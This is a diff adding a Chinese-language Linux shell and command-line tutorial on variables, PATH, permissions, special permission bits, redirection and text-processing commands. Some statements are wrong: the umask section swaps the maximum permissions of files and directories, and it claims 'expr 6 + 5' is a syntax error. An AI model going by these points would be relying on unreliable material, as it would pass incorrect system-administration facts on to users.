@@ -1,0 +1,1289 @@
+shell教程
+
+
+1、!/bin/bash 作用：告诉脚本使用的是哪种命令解释器，如不指shell,已当前shell作为执行的shell
+2、在shell中已#开头表示整行就被当作一个注释，执行时被忽略
+3、shell程序一般以.sh结尾
+
+创建shell程序的步骤：
+1、创建包含命令，和控制结构的文件
+2、修改这个文件的权限使他可以执行，使用chmod +x test.sh
+3、检测语法错误
+4、执行./example
+
+shell脚本的执行通常有以下方式：
+1、/root/test.sh 或./test.sh (当前路径下执行脚本的话要有执行权限 chmod +x tets.sh)  #不需要bash/sh 但需要执行权限
+2、bash test.sh 或 sh test.sh (这种方式可以不对脚本文件添加执行权限)                 #需要bash/sh
+3、source test.sh(可以没有执行权限)                                                 #不需要bash/sh 也不需要执行权限
+4、sh < test.sh 或者 cat test.sh | bash 或 cat test.sh | sh                          #需要bash/sh
+5、
+while read line                                                                      #不需要bash/sh, 也不需要执行权限
+do
+$line
+done < file.sh
+
+变量:数字，字母大小写，下划线
+VAR=123
+
+调用变量
+echo $VAR
+或
+echo ${VAR}
+
+
+命令里调用命令，`echo world`命令的输出，作为外层echo命令的值
+echo hello `echo world`
+或
+echo hello $(echo world)
+实例：打包
+tar zcvf poc.tar.gz $(find /home -name *.sh)
+解包
+tar zxvf 包名
+
+which 命令：显示命令路径
+[root@localhost opt]# which pwd
+/usr/bin/pwd
+
+
+删除变量
+unset VAR1
+
+
+
+局部变量
+[root@localhost home]#var1=123             #这就是局部变量
+[root@localhost home]#echo $var			   #在当前shell,可以显示	 
+123
+[root@localhost home]#vi a.sh              #创建一个a.sh文件
+#! /bin/bash								
+echo $var
+[root@localhost home]#echo var			   #在当前shell,可以显示
+123
+[root@localhost home]#bash a.sh   		   #执行a.sh时，会使用另一个bash执行,就访问不到$var的值
+
+全局变量
+env命令查看所有全局变量
+[root@localhost home]# env
+
+显示系统的全局变量：
+[root@localhost home]# echo $HOSTNAME
+
+[root@localhost home]# env | grep PATH
+
+使用export把这个局部变量输出为全局变量
+[root@localhost home]# export var=123      #export为全局变量
+[root@localhost home]# echo $var
+123
+[root@localhost home]# vi a.sh				#写入以下内容
+#!/bin/bash
+echo $var
+[root@localhost home]# bash a.sh			#引用全局变量成功
+123
+
+让变量永久生效，可以把定义好的变量写入配置文件
+当登录系统或开启一个ssh连接来启动bash进程时，一定会加载这4个配置文件：
+[root@localhost home]# vi /etc/profile        #系统全局环境和登录系统的一些配置
+[root@localhost home]# vi /etc/bashrc         #bash 全局自定义配置文件，用于自定义bash
+[root@localhost home]# vi /root/.bashrc       #用于单独自定义某干用户的bash
+[root@localhost home]# vi /root/.bash_profile #用户单独自定义某干用户的系统环境
+
+
+设置PATH环境变量
+shell要执行某一个程序，它要在系统中去搜索这个程序的路径，PATH变量时用来定义bash查找命令的目录，当我们安装了第三方程序后，可以把程序bin目录添加到这个PATH路径内，就可以在全局调用这个第三方程序
+
+例子1：
+[root@localhost ~]# vi /opt/backup                #写入以下内容
+#! /bin/bash
+echo "Backup data is OK!"
+[root@localhost ~]# chmod +x /opt/backup			#赋执行权限
+[root@localhost ~]# /opt/backup					#绝对路径执行
+[root@localhost ~]# backup
+-bash: PATH: 未找到命令
+[root@localhost ~]# PATH=/opt/:$PATH			#添加"/opt/:"在PATH的前面
+[root@localhost ~]# echo $PATH					#查看是否添加成功
+[root@localhost ~]# backup						#发现命令可以直接执行了，不用写全路径了
+Backup data is OK!
+或
+[root@localhost ~]# vi /etc/profile   #在文件最后追加以下内容，永久生效
+PATH=/opt/:$PATH
+[root@localhost ~]# source /etc/profile #重新加载配置文件，使配置生效
+
+
+
+传参
+[root@localhost ~]# vi 123.sh
+#!/bin/bash
+echo "本shell脚本名:$0"                 #$0：代表脚本本身
+echo "第一个参数：$1"					#$1：代表第一个参数
+echo "第二个参数：$2"					#$2：代表第二个参数
+echo "第三个参数：$3"					#$3：代表第三个参数
+echo "第四个参数：$4"					#$4：代表第四个参数
+[root@localhost ~]# chmod +x 123.sh
+[root@localhost ~]# ./123.sh 1 2 3 4
+本shell脚本名:./123.sh
+第一个参数：1
+第二个参数：2
+第三个参数：3
+第四个参数：4
+
+使用场景：服务器启动传参数
+[root@localhost ~]# /etc/init.d/network restart
+
+特殊变量
+[root@localhost ~]# vi special_variable.sh     #写入以下内容
+#!/bin/bash
+echo "$* 表示这个程序的所有参数"
+echo "$# 表示这个程序的参数个数"
+echo "$$ 表示程序的进程ID"
+touch /tmp/b.txt &
+echo "$! 执行上一个后台指令的PID"
+echo "$$ 表示程序的进程ID"
+echo "$? 表示上一个程序执行返回结果"
+[root@localhost ~]# bash special_variable.sh 11 22 333 44 5666
+11 22 333 44 5666 表示这个程序的所有参数
+5 表示这个程序的参数个数
+121604 表示程序的进程ID
+121605 执行上一个后台指令的PID
+121604 表示程序的进程ID
+0 表示上一个程序执行返回结果
+
+
+常用环境变量
+[root@localhost ~]# vi env.sh
+#!/bin/bash
+echo $HOME
+echo $PATH
+echo $PWD
+[root@localhost ~]# cd /opt
+[root@localhost opt]# bash /root/env.sh
+/root
+/root/:/opt/:/opt/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin
+/opt
+[root@localhost opt]#
+
+
+数学运算
+
+expr 命令：
+(1)对数字的基本计算，作比较时，输出结果假为0，真为1，特殊符号用转义符
+[root@localhost opt]# expr 6 \> 5				#比较运算
+1
+[root@localhost opt]# expr 6 \* 5				#乘法运算
+30
+[root@localhost opt]# expr 6 \+ 5				#加法运算
+11
+[root@localhost opt]# expr 6 + 5				#加法运算
+语法错误
+
+(2)对字符串的处理
+[root@localhost opt]# expr length "ni hao"
+6
+[root@localhost opt]# expr substr "ni hao" 2 4  #从第2个开始，截取4个字符出来
+i ha
+
+
+使用:$(())
+格式:$((表达式1，表达式2))
+特点：
+1、在双括号结构中，所有表达式可以像C语言一样，如a++,b--等。
+2、在双括号中，所有变量可以不加入：$符号前缀
+3、双括号可以进行逻辑运算，四则运算
+4、双括号结构扩展了for,while,if 条件测试运算
+5、支持多个表达式运算，各个表达式之间用","分开
+
+常用运算符：
+运算符						意义
+++ --					递增及递减，可前置也可后置
++ - ！~					一元运算的正负号，逻辑与取反
++ - * / %				加减乘除与余数
+< <= > >=				比较大小符号
+== !=   				相等 不相等
+>> <<					向左位移 向右位移
+& ^ |					位的与 位的异或 位的或
+&& ||					逻辑与 逻辑或
+? :						条件判断
+例子：
+[root@localhost opt]# b=$((2+3))				#使用:$(())
+[root@localhost opt]# echo $b
+5
+[root@localhost opt]# echo $((2*3))
+6
+[root@localhost opt]# ((b++))        #在双括号中，所有变量可以不加入：$符号前缀
+[root@localhost opt]# echo $b
+6
+[root@localhost opt]#
+
+实战-升级系统中的java版本到1.8版本
+安装jdk-8u161-linux-x64.rpm
+上传jdk-8u161-linux-x64.rpm 软件包到服务器
+[root@localhost opt]# rpm -ivh jdk-8u161-linux-x64.rpm
+[root@localhost opt]# rpm -pql /root/jdk-8u161-linux-x64.rpm #通过查看jdk的信息可以知道jdk的安装目录在/usr/java
+[root@localhost opt]# vi /etc/profile #在文件的最后添加以下内容：
+export JAVA_HOME=/usr/java/jdk1.8.0_161
+export JAVA_BIN=/usr/java/jdk1.8.0_161/bin
+export PATH=${JAVA_HOME}/bin:$PATH
+export CLASSPATH=.:${JAVA_HOME}/lib/dt.jar:${JAVA_HOME}/lib/tools.jar
+
+[root@localhost opt]# source /etc/porfile     #使配置生效
+[root@localhost opt]# java -version 		#验证是否成功
+
+结束！
+
+
+
+linu基础命令：
+
+开始！
+
+复制命令：
+增量备份将test/下的新增文件，复制到123/目录下，已有的文件不在复制
+cp -u test/* 123/
+
+查看帮助命令：
+1、man命令:
+
+
+查看命令帮助说明
+man date
+
+"/"搜索查找
+/date
+
+向上翻页
+pgUp
+
+向下翻页
+pgdn
+
+退出
+q
+
+
+搜索关键字为man的相关帮助文件
+man -f man 或 whatis man (man -f 相当于 whatis)
+
+模糊搜索关键字为man的相关帮助文件
+man -k man 或 apropos man (man -k 相当于 apropos)
+
+2、info命令：(info与man差不多，但与man page一口气输出一堆信息不同的是，info page则是将文件数据拆成一个一个的段落)
+info info
+
+其他帮助文件路径：
+ls /usr/share/doc
+
+linux档案权限篇：
+dr-xr-x---. 18 root    root         4096 8月  14 22:10 .
+dr-xr-xr-x. 17 root    root          224 7月   5 15:55 ..
+-rwxr-xr-x.  1 root    root          152 7月  17 03:16 123.sh
+-rwxrwxrwx.  1 root    root          986 7月  14 16:20 236d7925cfafc1f643babdb8e48966bf.sh
+-rw-r--r--.  1 root    root    321593344 1月   5 2021 236d_part1.pcap
+-rw-r--r--.  1 tcpdump tcpdump 447654474 1月   5 2021 236d.pcap
+-rw-r--r--.  1 root    root        74414 7月  16 20:32 access.log
+-rw-------.  1 root    root         1269 7月  20 2020 anaconda-ks.cfg
+-rw-------.  1 root    root        29986 8月  10 21:17 .bash_history
+-rw-r--r--.  1 root    root           18 12月 29 2013 .bash_logout
+-rw-r--r--.  1 root    root          177 7月  18 03:44 .bash_profile
+-rw-r--r--.  1 root    root          177 7月  18 03:44 .bashrc
+drwxrwxr-x.  7 nginx   nginx        4096 8月   3 2016 beautifulsoup4-4.5.1
+-rw-r--r--.  1 root    root       158039 8月   3 2016 beautifulsoup4-4.5.1.tar.gz
+drwxr-xr-x.  3 root    root           17 7月  23 2020 .cache
+lrwxrwxrwx.   1 root root           2 7月  20 2020 xzcat -> xz
+lrwxrwxrwx.   1 root root           6 7月  20 2020 xzcmp -> xzdiff
+
+
+-rwxrwxrwx说明：
+第一个字符代表档案的类型：
+d：代表目录
+-：代表文件
+l：代表连接文件
+b：代表块设备（如硬盘）
+c：代表字符设备（如键盘，鼠标等）
+
+接下来的字符中，以三个为一组，均为”rwx“的三个参数的组合。分别是r：可读；w：可写；x：可执行。注意，这三个权限的位置不会改变，如果没有权限，就是：”-“。
+
+例子：
+-rw-------只有所有者才有读和写的权限
+-rw-r--r--只有所有者才有读和写的权限，组群和其他人只有读的权限
+-rwx------只有所有者才有读，写，执行的权限
+
+
+
+第一组为拥有者的权限，第二组为同群组的权限，第三组为其他非本群组的权限。
+
+创建文件:heitian
+[root@localhost tmp]# touch heitian
+
+查看权限
+[root@localhost tmp]# ls -l
+-rw-r--r--. 1 root root 0 8月  14 22:41 heitian
+
+
+添加用户heetian
+[root@localhost tmp]# useradd heetian
+
+chown目命令:改变文件所有者
+[root@localhost tmp]# chown heetian ./heitian
+-rw-r--r--. 1 heetian root 0 8月  14 22:41 heitian
+
+chgrp命令:改变所属用户组
+[root@localhost tmp]# chgrp heetian ./heitian
+[root@localhost tmp]# ls -l
+总用量 4
+-rw-r--r--. 1 heetian heetian 0 8月  14 22:41 heitian
+-rw-r--r--. 1 root    root    6 8月  14 22:46 nactld.pid
+
+
+chmod命令:改变文件权限之 chmod 命令
+用法：chmod xyz -R [文件或目录]
+
+解释：xyz是三个数字，比如chmod 755 ./heetian
+
+-R ：递归，和chown，chgrp里面的-R是一样
+
+为了设置方便，linux里面可以用数字来代表权限，那是什么样的关系呢？
+
+R-----4
+W-----2
+X-----1
+
+每种身份（owner/group/others）各自的三个权限（r/w/x）分数是需要累加的，例如当权限为[-rwxrwxr--]分数则是：
+owner(所有者)：rwx=4+2+1=7
+
+group(用户组)：rwx=4+2+1=7
+
+others(其他用户)：r--=4+0+0=4
+
+那么该档案的权限数字就是774
+
+使用数字方式：
+[root@localhost tmp]# chmod 774 ./heitian
+[root@localhost tmp]# ls -l
+总用量 4
+-rw-rw-rw-. 1 root    root    0 8月  14 22:49 apsc
+-rwxrwxr--. 1 heetian heetian 0 8月  14 22:41 heitian
+
+
+改变权限之二，使用符号类型：
+u------user
+g------group
+o------others
+a------all
++:加入
+-:除去
+=:设定
+
+使用符号方式：
+
+"="符号用法：
+[root@localhost tmp]# chmod u=rx,g=rwx ./heitian
+[root@localhost tmp]# ls -l
+总用量 4
+-rw-rw-rw-. 1 root    root    0 8月  14 22:49 apsc
+-r-xrwxr--. 1 heetian heetian 0 8月  14 22:41 heitian
+
+"+"符号用法：
+[root@localhost tmp]# chmod u+w ./heitian
+[root@localhost tmp]# ls -l
+总用量 4
+-rw-rw-rw-. 1 root    root    0 8月  14 22:59 apsc
+-rwxrwxr--. 1 heetian heetian 0 8月  14 22:41 heitian
+-rw-r--r--. 1 root    root    5 8月  14 23:01 nactld.pid
+
+chown root:root 用法：
+[root@localhost heetian]# chown root:root ./test.txt
+[root@localhost heetian]# ls -l
+总用量 0
+-rwxrwxr--. 1 heetian heetian 0 8月  14 23:06 123.txt
+-rw-rw-r--. 1 root    root    0 8月  14 23:11 test.txt
+结果：/tmp/heetian/test.txt文件所有者和用户组都是root
+
+
+umask命令：利用umask指令设置档案的默认权限
+当前用户在建立文件或者目录时候的默认权限值
+
+[root@localhost tmp]# umask -S
+u=rwx,g=rx,o=rx
+
+"目录" ：最大权限为666，因为没有可执行权限
+"文件" : 最大权限为777
+
+如果系统的umask值是0022，那么建立的档案分配的权限是啥呢？
+
+建立文件时：（-rw-rw-rw-）-(-----w—w-) => rw-r--r--
+
+建立目录时：（drwxrwxrwx）-（d---w—w-）=> drwxr-xr-x
+
+[root@localhost tmp]# umask 033
+[root@localhost tmp]# mkdir 456
+[root@localhost tmp]# ls -l
+总用量 4
+drwxr--r--. 2 root root 6 8月  14 23:29 456
+drwxr-xr-x. 2 root root 6 8月  14 23:19 heetian
+-rw-r--r--. 1 root root 0 8月  14 23:20 test1
+[root@localhost tmp]# umask 022
+[root@localhost tmp]# umask
+0022
+
+
+chattr命令:linux档案隐藏属性设定
+
+[root@localhost tmp]# touch heetian
+[root@localhost tmp]# ls -l
+总用量 4
+-rw-r--r--. 1 root root 0 8月  14 23:45 heetian
+-rw-r--r--. 1 root root 5 8月  14 23:44 nactld.pid
+[root@localhost tmp]# chattr +i ./heetian					#i属性：设置之后此档案不能被删除，改名，设定链接都不行
+[root@localhost tmp]# rm heetian
+rm：是否删除普通空文件 "heetian"？y
+rm: 无法删除"heetian": 不允许的操作
+[root@localhost tmp]# rm -f  heetian
+rm: 无法删除"heetian": 不允许的操作
+[root@localhost tmp]#
+
+[root@localhost tmp]# echo "112233" >> heetian.txt
+[root@localhost tmp]# cat heetian.txt
+112233
+[root@localhost tmp]# chattr +a ./heetian.txt            #a属性：设置之后，只能对档案增加数据，而不能删除也不能修改数据
+[root@localhost tmp]# echo "9898" >> heetian.txt			#可以追加
+[root@localhost tmp]# cat heetian.txt
+112233
+9898
+[root@localhost tmp]# echo "cover word test2" > heetian.txt  #不能修改内容
+-bash: heetian.txt: 不允许的操作
+[root@localhost tmp]# mv heetian.txt heetian.txt1            #不能修改名字
+mv: 无法将"heetian.txt" 移动至"heetian.txt1": 不允许的操作
+[root@localhost tmp]# rm  -f heetian.txt                     #不能删除
+rm: 无法删除"heetian.txt": 不允许的操作
+
+档案特殊权限设置：
+在原来的三个数字之前再加一个数字，它们的值分别是：
+SUID：4 
+SGID：2 
+SBIT：1 
+
+
+Set UID：当一个档案的拥有者的x权限位上是 s 的时候，此时被称为Set UID ,简称SUID的特殊权限。SUID有以下限制和功能：
+1、SUID权限仅对二进制程序有效
+2、执行者对于该程序需要具有x的权限
+3、本权限仅在执行该程序过程中有效
+4、执行者将具有该程序拥有者的权限
+ 
+[root@localhost tmp]# touch hetian
+[root@localhost tmp]# chmod 4755 hetian					#设置SUID权限
+[root@localhost tmp]# ls -l
+总用量 8
+-rwsr-xr-x. 1 root root  0 8月  14 23:55 hetian
+
+
+Set GID：当一个档案的用户组的 x 权限位为 s 的时候，此时被称为Set GID，简称SGID。SGID有如下功能:
+1、SGID对二进制程序有用
+2、程序执行者对于该程序，需要具备x的权限
+3、执行者在执行程序的过程中会获得该程序用户组的权限
+
+[root@localhost tmp]# chmod 6755 hetian					#设置SGID权限
+[root@localhost tmp]# ls -l
+总用量 8
+-rwsr-sr-x. 1 root root  0 8月  14 23:55 hetian
+
+SBIT：只对目录有效，对文件无效。作用是：
+当用户对此目录具有wx权限，即有写入权限时，当用户在该目录下建立目录或者文件时，仅有自己和root才有权力删除
+
+[root@localhost tmp]# chmod 1755 hetian
+[root@localhost tmp]# ls -l
+总用量 8
+-rwxr-xr-t. 1 root root  0 8月  14 23:55 hetian         #设置SBIT权限
+
+结果：t权限出现在others的权限，SBIT的作用是：防止除了自己和root以外的用户删除
+
+
+
+数据流重定向的使用：< 、<< 、>、 >>、 2>、 2<<
+不管是正确信息还是错误的信息都会默认输出到屏幕上，屏幕会显得比较乱。所以我们希望将两股数据分开。这就是数据流重定向的功能，数据流重定向可以将Standard output与Standard errot output 分别传送到其他的文件或者设备上去。分别传送所用的特殊字符如下：
+
+1、标准输入（stdin）：代码为 0，使用 < 或者 << ；
+2、标准输出（stdout）：代码为 1 ，使用 > 或者 >>；
+3、标准错误输出（stderr）：代码为2，使用 2>或者 2>> ；
+其中 > 是覆盖，而 >>  是累加。
+
+
+
+实验一：标准输出
+例子1：
+[root@localhost tmp]# ll / > root_file
+[root@localhost tmp]# cat root_file
+总用量 28
+lrwxrwxrwx.   1 root root    7 7月  20 2020 bin -> usr/bin
+dr-xr-xr-x.   5 root root 4096 7月  16 11:11 boot
+drwxr-xr-x.  20 root root 3260 8月  15 13:25 dev
+drwxr-xr-x.  81 root root 8192 8月  15 13:25 etc
+drwxr-xr-x.   9 root root 4096 8月  14 22:43 home
+lrwxrwxrwx.   1 root root    7 7月  20 2020 lib -> usr/lib
+lrwxrwxrwx.   1 root root    9 7月  20 2020 lib64 -> usr/lib64
+drwxr-xr-x.   2 root root    6 4月  11 2018 media
+drwxr-xr-x.   3 root root   18 7月  19 2020 mnt
+drwxr-xr-x.   8 root root  182 8月  10 18:38 opt
+dr-xr-xr-x. 222 root root    0 8月  15 13:25 proc
+dr-xr-x---.  18 root root 4096 8月  14 22:10 root
+drwxr-xr-x.  30 root root  880 8月  15 13:25 run
+lrwxrwxrwx.   1 root root    8 7月  20 2020 sbin -> usr/sbin
+drwxr-xr-x.   2 root root    6 4月  11 2018 srv
+dr-xr-xr-x.  13 root root    0 8月  15 13:25 sys
+drwxrwxrwt.   9 root root 4096 8月  15 13:28 tmp
+drwxr-xr-x.  13 root root  155 7月  20 2020 usr
+drwxr-xr-x.  20 root root  278 7月  19 2020 var
+
+例子2：利用一般用户 ，搜索/home 底下是否有名为.bashrc 的档案存在。
+[root@localhost tmp]# useradd hetian
+[root@localhost tmp]# su hetian
+[hetian@localhost tmp]$ find /home -name .bashrc
+find: ‘/home/nginx’: 权限不够
+find: ‘/home/heitian’: 权限不够
+find: ‘/home/heetian’: 权限不够
+/home/hetian/.bashrc
+[hetian@localhost tmp]$ find /home -name .bashrc > right 2>error                 #2>的使用：正确输出->right 错误输出->error    备注：2代表错误输出
+[hetian@localhost tmp]$ cat right													#查看right文件
+/home/hetian/.bashrc
+[hetian@localhost tmp]$ cat error													#查看error文件
+find: ‘/home/nginx’: 权限不够
+find: ‘/home/heitian’: 权限不够
+find: ‘/home/heetian’: 权限不够
+
+标准输入的使用：
+简单来说，就是将原本由键盘输入的数据，改为由档案内容来取代
+[root@localhost tmp]# cat > hetian                                
+welcome to hetian lab[root@localhost tmp]# ls						#ctrl D 代表退出
+heetian  heetian.txt  hetian  nactld.pid
+[root@localhost tmp]# cat hetian
+welcome to hetian lab[root@localhost tmp]#
+
+
+用文件内容代替键盘输入呢？使用标准输入就行了
+[root@localhost tmp]# cat > hetian < ~/.bashrc                  #<的使用:.bashrc文件的内容代替了"cat > hetian" 即将要键盘输入的内容
+[root@localhost tmp]# ll hetian  ~/.bashrc						#heetian 和 .bashrc这个两个文件大小,权限，所属用户，用户组都一样，就和复制的一样
+-rw-r--r--. 1 root root 177 8月  15 13:51 hetian              
+-rw-r--r--. 1 root root 177 7月  18 03:44 /root/.bashrc
+[root@localhost tmp]# cat hetian                              #查看hetian文件
+# .bashrc
+
+# User specific aliases and functions
+
+alias rm='rm -i'
+alias cp='cp -i'
+alias mv='mv -i'
+
+# Source global definitions
+if [ -f /etc/bashrc ]; then
+        . /etc/bashrc
+fi
+
+[root@localhost tmp]# cat ~/.bashrc						#查看.bashrc文件
+# .bashrc
+
+# User specific aliases and functions
+
+alias rm='rm -i'
+alias cp='cp -i'
+alias mv='mv -i'
+
+# Source global definitions
+if [ -f /etc/bashrc ]; then
+        . /etc/bashrc
+fi
+
+<<的使用：
+注意：在标准输入重定向中<<并不表示追加，而是表示结束输入的意思，即作为一个结束符。
+例子：我们用cat 直接将输入的信息输出到 test中，当键盘输入 over 时，结束本次输入。
+[root@localhost tmp]# cat > test << "over"          #<<的使用
+> welcome to hetian									#键盘输入内容：welcome to hetian
+> over                                                 #键盘输入over结束本次输入
+[root@localhost tmp]# cat test							#查看test文件
+welcome to hetian
+[root@localhost tmp]#
+
+垃圾桶用法
+有时候我们需要将信息统统丢掉，不显示到屏幕，也不记录到如何文件，有什么办法呢？
+当然有，在我们的linux中，有一个设备 /dev/null，也就是空设备的意思，它就像一个黑洞，任何东西进入它都会消失。所有我们只需要将数据流重定向指这个设备就行了。
+[root@localhost tmp]# cat /etc/profile > /dev/null                      #垃圾桶用法
+[root@localhost tmp]#
+
+
+
+[root@localhost tmp]# su hetian
+[hetian@localhost tmp]$ find /home -name .bashrc > home_file 2>/dev/null          #正确的信息保留为home_file 错误信息丢掉
+[hetian@localhost tmp]$ ls -l
+总用量 20
+-rw-rw-r--. 1 hetian hetian  21 8月  15 14:09 home_file
+[hetian@localhost tmp]$ cat home_file									#查看home_file文件
+/home/hetian/.bashrc
+[hetian@localhost tmp]$ find /home -name .bashrc          #实际上的效果
+find: ‘/home/nginx’: 权限不够
+find: ‘/home/heitian’: 权限不够
+find: ‘/home/heetian’: 权限不够
+/home/hetian/.bashrc
+[hetian@localhost tmp]$
+
+
+选取命令的使用
+
+1、选取命令之cut：
+选取命令就是将一段数据经过分析后，取出我们所想要的。或者是经由分析关键词，取得我们所想要的那一行！ 不过，要注意的是，一般来说，选取信息通常是针对『一行一行』来分析的， 并不是整篇信息分析的喔
+
+[root@localhost ~]# echo $PATH
+/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin
+[root@localhost ~]# echo $PATH | cut -d ':' -f 4                         #-d:后面接分隔字符,与-f一起使用; -f:依据 -d 的分隔字符将一段信息分割成为数段，用 -f 取出第几段的意思；
+/bin                                                                   #第4段为：/bin
+[root@localhost ~]# echo $PATH | cut -d ':' -f 2,5
+/usr/local/bin:/usr/sbin                                               #第2段为：/usr/local/bin 第5段为：/usr/sbin
+[root@localhost ~]#
+
+
+[root@localhost tmp]# cat > test.txt
+123456789abcdefghijkl
+123456789abcdefghijkl
+123456789abcdefghijkl
+123456789abcdefghijkl
+qwertyuiopasdfghjklzx
+[root@localhost tmp]# cat test.txt | cut -c 12                   #选取第12个字符
+c
+c
+c
+c
+s
+[root@localhost tmp]# cat test.txt | cut -c 12-				  #选取第12个且以后的字符
+cdefghijkl
+cdefghijkl
+cdefghijkl
+cdefghijkl
+sdfghjklzx
+[root@localhost tmp]# cat test.txt | cut -c 12-16				#选取第12至16的字符
+cdefg
+cdefg
+cdefg
+cdefg
+sdfgh
+[root@localhost tmp]#
+
+
+
+2、选取命令之grep：
+
+命令：grep
+
+参数：grep [-acinv] [--color=auto] '搜寻字符串' filename
+
+说明：-a ：将 binary 文件以 text 文件的方式搜寻数据
+
+      -c ：计算找到 '搜寻字符串' 的次数
+
+      -i ：忽略大小写的不同，所以大小写视为相同									#常用
+
+      -n ：顺便输出行号                                                         #常用
+
+      -v ：反向选择，亦即显示出没有 '搜寻字符串' 内容的那一行！ 				#常用
+
+      --color=auto ：可以将找到的关键词部分加上颜色的显示喔！
+	  
+[root@localhost tmp]#  last |grep 'root'                                              #选取关键字："root"
+root     pts/0        192.168.159.1    Wed Jun  2 09:50 - crash (4+11:07)
+root     tty1                          Wed Jun  2 09:45 - crash (4+11:11)
+root     pts/0        192.168.111.1    Tue Mar 23 15:01 - crash (70+18:44)
+root     tty1                          Tue Mar 23 15:00 - crash (70+18:44)
+[root@localhost tmp]#  last |grep -v 'root'                                            #-v:取反，不包括关键字'root' 
+reboot   system boot  3.10.0-1127.13.1 Fri Jun 18 10:28 - 21:10 (25+10:42)
+reboot   system boot  3.10.0-1127.13.1 Thu Jun 17 11:15 - 21:10 (26+09:54)
+reboot   system boot  3.10.0-1127.13.1 Wed Jun 16 10:12 - 21:10 (27+10:58)
+reboot   system boot  3.10.0-1127.13.1 Tue Jun 15 09:52 - 21:10 (28+11:17)
+
+
+
+排序命令的使用
+
+排序命令之 sort命令
+
+命令：sort
+
+参数：sort [-fbMnrtuk] [file or stdin]
+
+说明：-f  ：忽略大小写的差异，例如 A 与 a 视为编码相同；
+
+      -b  ：忽略最前面的空格符部分；
+
+      -M  ：以月份的名字来排序，例如 JAN, DEC 等等的排序方法；
+
+      -n  ：使用『纯数字』进行排序(默认是以文字型态来排序的)；
+
+      -r  ：反向排序；
+
+      -u  ：就是 uniq ，相同的数据中，仅出现一行代表；
+
+      -t  ：分隔符，默认是用 [tab] 键来分隔；
+
+      -k  ：以那个区间 (field) 来进行排序的意思
+	  
+例1：个人账号都记录在 /etc/passwd 下，请将账号进行排序。
+[root@localhost tmp]# cat /etc/passwd | sort             #sort 默认是以第一个字符排序的，而且默认是以文字来排序的，所以由a开始排序
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+bin:x:1:1:bin:/bin:/sbin/nologin
+chrony:x:998:996::/var/lib/chrony:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+
+[root@localhost tmp]#
+
+例2：/etc/passwd文件内容是以 ： 来分割的，如果我们要以第三栏来排序，可以这样：
+[root@localhost tmp]# cat /etc/passwd | sort -t ":" -k 3                 #-t表示：":" 指定分隔符":"，-k 3表示：分隔后的第三段排序（默认是以文字型态排序）
+root:x:0:0:root:/root:/bin/bash
+nginx:x:1000:1000::/home/nginx:/bin/bash
+heitian:x:1001:1001::/home/heitian:/bin/bash
+heetian:x:1002:1002::/home/heetian:/bin/bash
+hetian:x:1003:1003::/home/hetian:/bin/bash
+operator:x:11:0:operator:/root:/sbin/nologin
+bin:x:1:1:bin:/bin:/sbin/nologin
+
+
+[root@localhost tmp]# cat /etc/passwd | sort -t ":" -k 3 -n   #-n :按数字排序
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+
+
+统计命令：wc
+
+这里的wc可不是公厕哦！！linux中 wc命令的功能为统计指定文件中的字节数、字数、行数，并将统计结果显示输出
+命令：wc
+参数：wc [-lwm]
+说明：-l  ：仅列出行；
+
+      -w  ：仅列出多少字(英文单词)；
+
+      -m  ：多少字符；
+	  
+[root@localhost tmp]# cat /etc/passwd | wc                #默认统计行数，英文单词数，字符数
+     26      35    1164
+[root@localhost tmp]# cat /etc/passwd | wc -l     
+26										        				#26行
+[root@localhost tmp]# cat /etc/passwd | wc  -w
+35																	#35个英文单词
+[root@localhost tmp]# cat /etc/passwd | wc  -m
+1164                                                          #1164个字符
+[root@localhost tmp]#
+
+
+双向重定向命令(即到文件又到屏幕):tee
+
+tee 会同时将数据流分送到文件去与屏幕 (screen)；而输出到屏幕的，其实就是 stdout ，可以让下个命令继续处理。
+命令：tee
+参数：tee -a file
+说明：-a  ：以累加 (append) 的方式，将数据加入 file 当中！
+
+例1：将 last 的输出存一份到 last.list 文件中，并且选取第一列显示出来
+[root@localhost tmp]# last |tee last.list |cut -d " " -f 1                 #结果记录到last.list 并输出到stdout,作为cut命令的stdin
+root
+root
+reboot
+root
+root
+reboot
+[root@localhost tmp]# cat last.list
+root     pts/0        192.168.111.1    Sun Aug 15 13:26   still logged in
+root     tty1                          Sun Aug 15 13:25   still logged in
+reboot   system boot  3.10.0-1127.13.1 Sun Aug 15 13:25 - 16:00  (02:34)
+root     pts/0        192.168.111.1    Sat Aug 14 21:29 - crash  (15:56)
+root     tty1                          Sat Aug 14 21:29 - crash  (15:56)
+
+
+例2：将 ls /home 的数据存一份到 ~/homefile ，同时屏幕也有输出信息！
+[root@localhost tmp]# ls -l /home | tee ~/homefile | more                   #结果记录到homefile文件，并输出到stdout,作为more命令的stdin
+总用量 168
+-rw-r--r--. 1 root    root        0 7月  18 03:46 123
+-rwxrwxrwx. 1 root    root      412 7月  21 10:31 Alibaba Nacos 未授权访问漏洞.sh
+-rwxrwxrwx. 1 root    root       22 7月  21 10:31 a.sh
+-rwxrwxrwx. 1 root    root      403 7月  21 10:31 Atlassian Jira 信息泄露漏洞 CVE-2020-14181.sh
+-rw-r--r--. 1 root    root     1031 7月  17 02:30 a.txt
+drwxr-xr-x. 3 root    root       23 6月  11 12:58 centos_64
+[root@localhost tmp]# cat ~/homefile
+总用量 168
+-rw-r--r--. 1 root    root        0 7月  18 03:46 123
+-rwxrwxrwx. 1 root    root      412 7月  21 10:31 Alibaba Nacos 未授权访问漏洞.sh
+-rwxrwxrwx. 1 root    root       22 7月  21 10:31 a.sh
+-rwxrwxrwx. 1 root    root      403 7月  21 10:31 Atlassian Jira 信息泄露漏洞 CVE-2020-14181.sh
+-rw-r--r--. 1 root    root     1031 7月  17 02:30 a.txt
